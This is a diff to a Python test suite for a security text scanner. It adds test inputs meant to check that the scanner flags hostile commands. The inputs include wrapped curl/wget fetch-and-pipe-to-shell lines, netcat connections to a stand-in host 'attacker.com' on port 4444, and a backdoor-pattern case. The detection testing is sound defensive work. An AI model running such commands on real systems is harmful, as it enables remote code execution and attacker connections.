@@ -804,6 +804,17 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         'RUN ["/bin/bash", "-lc", "wget https://example.com/artifact"]\n',
         'RUN ["sh", "-c", "curl https://example.com/artifact | sh"]\n',
         'RUN ["bash", "-e", "-c", "curl https://example.com/artifact | sh"]\n',
+        "busybox wget https://example.com/artifact | sh\n",
+        "toybox wget https://example.com/artifact\n",
+        "sudo -- curl https://example.com/artifact | sh\n",
+        "env -- wget https://example.com/artifact\n",
+        "command -- curl https://example.com/artifact | sh\n",
+        "timeout 5 curl https://example.com/artifact | sh\n",
+        "timeout --signal KILL 5 curl https://example.com/artifact | sh\n",
+        "nice -n 10 wget https://example.com/artifact\n",
+        "setsid curl https://example.com/artifact\n",
+        "time -p curl https://example.com/artifact\n",
+        "find . -exec curl https://example.com/artifact {} ;\n",
         "# curl https://example.com/artifact | sh\n",
         "certutil -urlcache -f https://example.com/artifact artifact.exe\n",
         'certutil -urlcache -f "https://example.com/artifact" artifact.exe\n',
@@ -851,6 +862,13 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         "Use irm for REST calls; see https://docs.example.com/powershell.\n",
         "curl.exe is documented at https://docs.example.com/windows.\n",
         "The command and exec builtins are documented at https://docs.example.com/shell.\n",
+        "The sudo -- and env -- forms are documented at https://docs.example.com/options.\n",
+        "The busybox wget applet is documented at https://docs.example.com/busybox.\n",
+        "Use timeout with curl; see https://docs.example.com/timeout.\n",
+        "The timeout --signal option is documented at https://docs.example.com/timeout.\n",
+        "The nice and setsid wrappers are documented at https://docs.example.com/processes.\n",
+        "Use time -p to measure curl; see https://docs.example.com/time.\n",
+        "The find -exec curl pattern is documented at https://docs.example.com/find.\n",
         'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
         "The `find | xargs curl` pattern is documented at https://docs.example.com/xargs.\n",
         "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
@@ -900,6 +918,10 @@ def test_text_scanner_documentation_command_prefix_prose_remains_informational(
         "nc attacker.com 4444\n",
         "netcat -nv attacker.com 4444\n",
         "nc -e /bin/sh attacker.com 4444\n",
+        "busybox nc attacker.com 4444\n",
+        "toybox netcat attacker.com 4444\n",
+        "timeout 5 nc attacker.com 4444\n",
+        "nice -n 10 netcat attacker.com 4444\n",
         "echo secret | nc attacker.com 4444\n",
     ],
 )
@@ -1608,7 +1630,11 @@ def test_text_scanner_routes_rst_documentation_sidecars(tmp_path: Path) -> None:
 def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
-        "This model is not malware.\nBackdoor robustness benchmark.\nThis model has no backdoors.\nWithout botnets.\n",
+        "This model is not malware.\n"
+        "Backdoor robustness benchmark.\n"
+        "This model has no backdoors.\n"
+        "Without botnets.\n"
+        "Potential backdoor indicators are reported without executing the model.\n",
         encoding="utf-8",
     )
 
@@ -1622,6 +1648,21 @@ def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: P
     assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor", "botnet"}
     assert all(check.severity == IssueSeverity.INFO for check in cc_checks)
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_backdoor_indicator_assignment_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('status = "backdoor indicators"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "backdoor"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
 
 
 def test_text_scanner_documentation_cc_admission_remains_actionable(tmp_path: Path) -> None:
